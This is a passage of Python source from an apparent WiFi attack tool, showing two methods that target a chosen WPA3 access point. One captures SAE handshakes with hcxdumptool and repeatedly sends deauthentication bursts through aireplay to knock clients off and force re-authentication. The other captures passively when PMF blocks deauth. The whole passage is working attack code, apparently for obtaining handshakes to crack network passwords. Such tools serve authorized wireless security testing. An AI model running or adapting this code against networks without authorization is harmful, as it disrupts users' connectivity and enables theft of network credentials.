        Handles:
        - Tool availability checks
        - Incomplete handshake detection
        - Timeout scenarios
        - Tool execution failures
        - PMF-related capture issues
        
        Returns:
            SAEHandshake object if successful, None otherwise
        """
        from ..tools.hcxdumptool import HcxDumpTool
        from ..model.sae_handshake import SAEHandshake
        
        # Check if hcxdumptool is available
        if not HcxDumpTool.exists():
            Color.pl('{!} {R}hcxdumptool not found - cannot capture SAE handshake{W}')
            Color.pl('{!} {O}Install: {C}apt install hcxdumptool{W} or visit {C}https://github.com/ZerBea/hcxdumptool{W}')
            if self.view:
                self.view.add_log('ERROR: hcxdumptool not found')
            return None
        
        # Determine if PMF prevents deauth
        pmf_required = self.wpa3_info.get('pmf_status') == 'required'
        enable_deauth = not pmf_required
        
        handshake = None
        hcxdump = None
        
        try:
            # Start hcxdumptool capture
            hcxdump = HcxDumpTool(channel=self.target.channel,
                            target_bssid=self.target.bssid,
                            enable_deauth=enable_deauth,
                            pmf_required=pmf_required)
            hcxdump.__enter__()
            
            Color.clear_entire_line()
            Color.pattack('WPA3', self.target, 'SAE Capture', 'Starting capture...')
            
            # Set timeout for SAE capture (use WPA3-specific timeout if configured)
            timeout_value = Configuration.wpa3_attack_timeout if Configuration.wpa3_attack_timeout else Configuration.wpa_attack_timeout
            capture_timeout = Timer(timeout_value)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
            
            Color.pl('{+} {C}Capturing SAE handshake with hcxdumptool...{W}')
            if pmf_required:
                Color.pl('{!} {O}PMF required - using passive capture (no deauth){W}')
            
            incomplete_handshake_count = 0
            max_incomplete_attempts = 3
            
            # Progress tracking
            last_progress_update = time.time()
            progress_interval = 10  # Update progress every 10 seconds
            total_time = timeout_value
            
            while not capture_timeout.ended():
                step_timer = Timer(1)
                
                # Calculate progress
                elapsed = capture_timeout.running_time()
                progress_pct = min(100, int((elapsed / total_time) * 100))
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': 'Capturing SAE handshake',
                        'metrics': {
                            'Progress': f'{progress_pct}%',
                            'Mode': 'Passive' if pmf_required else 'Active',
                            'Time Remaining': str(capture_timeout),
                            'Incomplete Attempts': incomplete_handshake_count
                        }
                    })
                
                # Periodic progress update for classic mode
                current_time = time.time()
                if current_time - last_progress_update >= progress_interval:
                    Color.pl('{+} {C}SAE capture progress: {G}%d%%{W} complete, {C}%s{W} remaining{W}' % 
                           (progress_pct, str(capture_timeout)))
                    last_progress_update = current_time
                
                # Deauth clients periodically if allowed
                if enable_deauth and deauth_timer.ended():
                    Color.pattack('WPA3', self.target, 'SAE Capture',
                                 'Deauthing clients to trigger SAE...')
                    
                    if self.view:
                        self.view.add_log('Sending deauth to trigger SAE authentication')
                    
                    try:
                        # Use aireplay to deauth
                        Aireplay.deauth(self.target.bssid, essid=self.target.essid, num_deauths=5)
                    except Exception as e:
                        Color.pl('{!} {O}Deauth failed: %s{W}' % str(e))
                        if self.view:
                            self.view.add_log(f'Deauth error: {str(e)}')
                    
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                
                # Check if we've captured data
                try:
                    if hcxdump.has_new_data():
                        # Create SAEHandshake object
                        sae_hs = SAEHandshake(
                            hcxdump.get_output_file(),
                            self.target.bssid,
                            self.target.essid
                        )
                        
                        # Check if handshake is complete
                        if sae_hs.has_complete_handshake():
                            Color.pl('\n{+} {G}Captured complete SAE handshake!{W}')
                            if self.view:
                                self.view.add_log('Complete SAE handshake captured')
                            handshake = sae_hs
                            break
                        else:
                            # Incomplete handshake detected
                            incomplete_handshake_count += 1
                            Color.pl('\n{!} {O}Incomplete SAE handshake detected (attempt %d/%d){W}' %
                                   (incomplete_handshake_count, max_incomplete_attempts))
                            if self.view:
                                self.view.add_log(f'Incomplete handshake (attempt {incomplete_handshake_count})')
                            
                            # If too many incomplete attempts, provide guidance
                            if incomplete_handshake_count >= max_incomplete_attempts:
                                Color.pl('{!} {O}Multiple incomplete handshakes detected{W}')
                                Color.pl('{!} {O}Possible causes:{W}')
                                Color.pl('    - Client not completing SAE authentication')
                                Color.pl('    - Signal strength too weak')
                                Color.pl('    - PMF interfering with capture')
                                Color.pl('    - Tool configuration issue')
                                if self.view:
                                    self.view.add_log('Multiple incomplete handshakes - check signal/PMF')
                
                except Exception as e:
                    Color.pl('{!} {R}Error checking captured data: %s{W}' % str(e))
                    if self.view:
                        self.view.add_log(f'Capture check error: {str(e)}')
                
                # Update status
                status_msg = 'Listening for SAE authentication (%s)' % capture_timeout
                Color.pattack('WPA3', self.target, 'SAE Capture', status_msg)
                
                time.sleep(step_timer.remaining())
            
            # Timeout reached
            if not handshake:
                Color.pl('\n{!} {O}SAE capture timeout reached{W}')
                if incomplete_handshake_count > 0:
                    Color.pl('{!} {O}Captured %d incomplete handshake(s){W}' % incomplete_handshake_count)
                    Color.pl('{!} {O}Try increasing timeout with --wpa3-timeout{W}')
                else:
                    Color.pl('{!} {O}No SAE authentication detected{W}')
                    Color.pl('{!} {O}Possible causes:{W}')
                    Color.pl('    - No clients connected')
                    Color.pl('    - Clients not reconnecting')
                    Color.pl('    - PMF preventing deauth (try --force-sae for passive mode)')
                
                if self.view:
                    self.view.add_log('SAE capture timeout - no complete handshake')
        
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}SAE capture interrupted by user{W}')
            if self.view:
                self.view.add_log('Capture interrupted by user')
            raise
        
        except Exception as e:
            Color.pl('\n{!} {R}SAE capture failed: %s{W}' % str(e))
            if self.view:
                self.view.add_log(f'Capture failed: {str(e)}')
            Color.pl('{!} {O}This may be due to:{W}')
            Color.pl('    - Tool execution error')
            Color.pl('    - Insufficient permissions (try running as root)')
            Color.pl('    - Interface not in monitor mode')
            Color.pl('    - Incompatible tool version')
        
        finally:
            # Clean up hcxdumptool
            if hcxdump:
                try:
                    hcxdump.__exit__(None, None, None)
                except Exception as e:
                    Color.pl('{!} {O}Error cleaning up hcxdumptool: %s{W}' % str(e))
        
        return handshake

    def passive_capture(self):
        """
        Capture SAE handshake passively (no deauth).
        
        Handles:
        - Tool availability checks
        - Extended timeout scenarios
        - Incomplete handshake detection
        - Tool execution failures
        
        Returns:
            SAEHandshake object if successful, None otherwise
        """
        from ..tools.hcxdumptool import HcxDumpTool
        from ..model.sae_handshake import SAEHandshake
        
        # Check if hcxdumptool is available
        if not HcxDumpTool.exists():
            Color.pl('{!} {R}hcxdumptool not found - cannot capture SAE handshake{W}')
            Color.pl('{!} {O}Install: {C}apt install hcxdumptool{W} or visit {C}https://github.com/ZerBea/hcxdumptool{W}')
            if self.view:
                self.view.add_log('ERROR: hcxdumptool not found')
            return None
        
        handshake = None
        hcxdump = None
        
        try:
            # Start hcxdumptool in passive mode
            hcxdump = HcxDumpTool(channel=self.target.channel,
                            target_bssid=self.target.bssid,
                            enable_deauth=False,  # Passive mode
                            pmf_required=True)
            hcxdump.__enter__()
            
            Color.clear_entire_line()
            Color.pattack('WPA3', self.target, 'Passive Capture', 'Waiting for natural reconnections...')
            
            # Set timeout for passive capture (longer than active, use WPA3-specific timeout if configured)
            timeout_value = Configuration.wpa3_attack_timeout if Configuration.wpa3_attack_timeout else Configuration.wpa_attack_timeout
            capture_timeout = Timer(timeout_value * 2)
            
            Color.pl('{+} {C}Passive SAE capture - waiting for client reconnections...{W}')
            Color.pl('{!} {O}This may take longer as we cannot force reconnections{W}')
            Color.pl('{!} {O}PMF prevents deauth attacks - waiting for natural authentication{W}')
            
            incomplete_handshake_count = 0
            last_status_time = time.time()
            status_interval = 30  # Show status every 30 seconds
            
            # Progress tracking
            total_time = timeout_value * 2  # Passive mode uses 2x timeout
            
            while not capture_timeout.ended():
                step_timer = Timer(1)
                
                # Calculate progress
                elapsed = capture_timeout.running_time()
                progress_pct = min(100, int((elapsed / total_time) * 100))
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': 'Passive SAE capture (waiting for clients)',
                        'metrics': {
                            'Progress': f'{progress_pct}%',
                            'Mode': 'Passive (PMF Protected)',
                            'Time Remaining': str(capture_timeout),
                            'Incomplete Attempts': incomplete_handshake_count
                        }
                    })
                
                # Periodic status update for long waits with progress
                current_time = time.time()
                if current_time - last_status_time >= status_interval:
                    Color.pl('{+} {C}Passive capture progress: {G}%d%%{W} complete, {C}%s{W} remaining{W}' % 
                           (progress_pct, capture_timeout))
                    if self.view:
                        self.view.add_log(f'Progress: {progress_pct}% - {capture_timeout} remaining')
                    last_status_time = current_time
                
                # Check if we've captured data
                try:
                    if hcxdump.has_new_data():
                        # Create SAEHandshake object
                        sae_hs = SAEHandshake(
                            hcxdump.get_output_file(),
                            self.target.bssid,
                            self.target.essid
                        )
                        
                        # Check if handshake is complete
                        if sae_hs.has_complete_handshake():
                            Color.pl('\n{+} {G}Captured complete SAE handshake passively!{W}')
                            if self.view:
                                self.view.add_log('Complete SAE handshake captured (passive)')
                            handshake = sae_hs
                            break
                        else:
                            # Incomplete handshake detected
                            incomplete_handshake_count += 1
                            Color.pl('\n{!} {O}Incomplete SAE handshake detected (attempt %d){W}' %
                                   incomplete_handshake_count)
                            if self.view:
                                self.view.add_log(f'Incomplete handshake (attempt {incomplete_handshake_count})')
                
                except Exception as e:
                    Color.pl('{!} {R}Error checking captured data: %s{W}' % str(e))
                    if self.view:
                        self.view.add_log(f'Capture check error: {str(e)}')
                
                # Update status
                status_msg = 'Waiting for SAE authentication (%s)' % capture_timeout
                Color.pattack('WPA3', self.target, 'Passive Capture', status_msg)
                
                time.sleep(step_timer.remaining())
            
            # Timeout reached
            if not handshake:
                Color.pl('\n{!} {O}Passive capture timeout reached{W}')
                if incomplete_handshake_count > 0:
                    Color.pl('{!} {O}Captured %d incomplete handshake(s){W}' % incomplete_handshake_count)
                else:
                    Color.pl('{!} {O}No SAE authentication detected during passive capture{W}')
                
                Color.pl('{!} {O}Passive capture requires:{W}')
                Color.pl('    - Clients to naturally disconnect and reconnect')
                Color.pl('    - Sufficient time for authentication to occur')
                Color.pl('    - Good signal strength for complete capture')
                Color.pl('{!} {O}Consider:{W}')
                Color.pl('    - Increasing timeout with --wpa3-timeout')
                Color.pl('    - Waiting for more client activity')
                Color.pl('    - Moving closer to the target AP')
                
                if self.view:
                    self.view.add_log('Passive capture timeout - no complete handshake')
        
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Passive capture interrupted by user{W}')
            if self.view:
                self.view.add_log('Capture interrupted by user')
            raise
        
        except Exception as e:
            Color.pl('\n{!} {R}Passive capture failed: %s{W}' % str(e))
            if self.view:
                self.view.add_log(f'Capture failed: {str(e)}')
            Color.pl('{!} {O}This may be due to:{W}')
            Color.pl('    - Tool execution error')
            Color.pl('    - Insufficient permissions (try running as root)')
            Color.pl('    - Interface not in monitor mode')
            Color.pl('    - Incompatible tool version')
        
        finally:
            # Clean up hcxdumptool
            if hcxdump:
                try:
                    hcxdump.__exit__(None, None, None)
                except Exception as e:
                    Color.pl('{!} {O}Error cleaning up hcxdumptool: %s{W}' % str(e))
        
        return handshake
